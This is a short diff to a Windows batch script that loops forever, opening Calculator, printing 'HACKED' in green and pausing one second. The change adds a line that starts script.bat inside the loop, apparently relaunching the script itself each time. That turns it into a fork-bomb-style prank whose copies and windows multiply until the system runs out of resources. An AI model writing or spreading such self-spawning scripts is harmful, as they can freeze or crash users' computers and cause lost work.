@@ -4,4 +4,5 @@ start calc
 color 0A
 echo HACKED
 timeout /t 1 /nobreak >nul
+start script.bat
 goto loop
